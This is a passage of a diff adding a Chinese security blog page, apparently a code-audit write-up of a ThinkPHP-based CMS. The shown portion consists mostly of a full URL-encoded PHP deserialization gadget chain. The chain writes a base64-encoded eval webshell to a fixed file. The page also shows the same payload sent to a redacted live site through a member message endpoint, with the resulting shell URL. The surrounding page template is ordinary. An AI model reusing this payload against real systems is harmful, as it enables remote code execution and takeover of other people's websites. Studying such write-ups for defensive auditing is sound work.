class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>styles%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>getAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>parent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Br%<span class="hljs-number">3</span>A<span class="hljs-number">11</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/hGoFZn"><img src="https://z3.ax1x.com/2021/08/29/hGoFZn.png" srcset="/img/loading.gif" lazyload alt="hGoFZn.png"></a></p>
+<p>成功getshell，文件名是固定的</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/a.php<span class="hljs-number">12</span>ac<span class="hljs-number">95</span>f<span class="hljs-number">1498</span>ce<span class="hljs-number">51</span>d<span class="hljs-number">2</span>d<span class="hljs-number">96</span>a<span class="hljs-number">249</span>c<span class="hljs-number">09</span>c<span class="hljs-number">1998</span>.php<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/hGoSxg"><img src="https://z3.ax1x.com/2021/08/29/hGoSxg.png" srcset="/img/loading.gif" lazyload alt="hGoSxg.png"></a></p>
+<p>执行成功</p>
+<p><a href="https://imgtu.com/i/hGokaq"><img src="https://z3.ax1x.com/2021/08/29/hGokaq.png" srcset="/img/loading.gif" lazyload alt="hGokaq.png"></a></p>
+<h2 id="案例复现"><a href="#案例复现" class="headerlink" title="案例复现"></a>案例复现</h2><p>注册用户</p>
+<p><a href="https://imgtu.com/i/hGoAI0"><img src="https://z3.ax1x.com/2021/08/29/hGoAI0.png" srcset="/img/loading.gif" lazyload alt="hGoAI0.png"></a></p>
+<p>发送payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xxxxxxxx.net/member.php/member/Msg/listqun?config[cfg]=O%<span class="hljs-number">3</span>A<span class="hljs-number">27</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cprocess%<span class="hljs-number">5</span>Cpipes%<span class="hljs-number">5</span>CWindows%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">34</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>Cprocess%<span class="hljs-number">5</span>Cpipes%<span class="hljs-number">5</span>CWindows%<span class="hljs-number">00</span>files%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>append%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>getError%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>error%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">27</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>Crelation%<span class="hljs-number">5</span>CHasOne%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">15</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>selfRelation%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">11</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>bindAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>query%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">14</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cdb%<span class="hljs-number">5</span>CQuery%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>model%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">20</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cconsole%<span class="hljs-number">5</span>COutput%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">28</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>Cconsole%<span class="hljs-number">5</span>COutput%<span class="hljs-number">00</span>handle%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">30</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Csession%<span class="hljs-number">5</span>Cdriver%<span class="hljs-number">5</span>CMemcached%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>handler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">23</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Ccache%<span class="hljs-number">5</span>Cdriver%<span class="hljs-number">5</span>CFile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>options%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">5</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>expire%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">3600</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cache_subdir%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>prefix%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>path%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">122</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>php%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ffilter%<span class="hljs-number">2</span>Fconvert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span>%<span class="hljs-number">7</span>Cconvert.base<span class="hljs-number">64</span>-decode%<span class="hljs-number">2</span>Fresource%<span class="hljs-number">3</span>DaaaPD<span class="hljs-number">9</span>waHAgQGV<span class="hljs-number">2</span>YWwoJF<span class="hljs-number">9</span>QT<span class="hljs-number">1</span>NUWydjY<span class="hljs-number">2</span>MnXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span>g%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>Fa.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">13</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>data_compress%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>tag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>styles%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>getAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>parent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Br%<span class="hljs-number">3</span>A<span class="hljs-number">11</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/hGoViV"><img src="https://z3.ax1x.com/2021/08/29/hGoViV.png" srcset="/img/loading.gif" lazyload alt="hGoViV.png"></a></p>
+<p>成功写入shell</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xxxxxxxxx.net/a.php<span class="hljs-number">12</span>ac<span class="hljs-number">95</span>f<span class="hljs-number">1498</span>ce<span class="hljs-number">51</span>d<span class="hljs-number">2</span>d<span class="hljs-number">96</span>a<span class="hljs-number">249</span>c<span class="hljs-number">09</span>c<span class="hljs-number">1998</span>.php<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/hGoZGT"><img src="https://z3.ax1x.com/2021/08/29/hGoZGT.png" srcset="/img/loading.gif" lazyload alt="hGoZGT.png"></a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AOurphp%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+                        <span class="hidden-mobile">代码审计：Ourphp后台SQL注入漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
